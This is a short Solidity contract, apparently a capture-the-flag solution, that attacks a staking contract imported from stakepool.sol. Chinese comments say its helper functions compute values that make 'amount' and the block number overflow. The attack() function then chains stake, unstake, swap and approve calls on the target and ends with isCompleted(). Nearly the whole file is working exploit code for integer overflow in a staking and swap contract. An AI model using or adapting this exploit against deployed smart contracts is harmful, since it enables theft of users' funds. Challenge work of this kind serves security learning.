pragma solidity ^0.6.12;
import "./stakepool.sol";
//figure函数算出让amount发生溢出的值，达成第一个条件
//fig1函数计算让blocknumber发生溢出的值，达成第二个条件
contract fig{
    check che;
    constructor(address _che)public{
        che = check(_che);
    }
    uint256 max = 2**256-1;
    uint256 eth = 10**18;
    function figure()public view returns(uint256){
        return (max/eth)+1;
    }
    function fig1()public pure returns(uint256){
        return 2**256-5;
    }

    function attack()public{
        che.stake(0,fig1());
        che.unstake();
        che.swap(600000);
        
        che.token().approve(address(che),10000000000 ether);
        che.stake(figure(),fig1());
        
        che.isCompleted();
    }
}
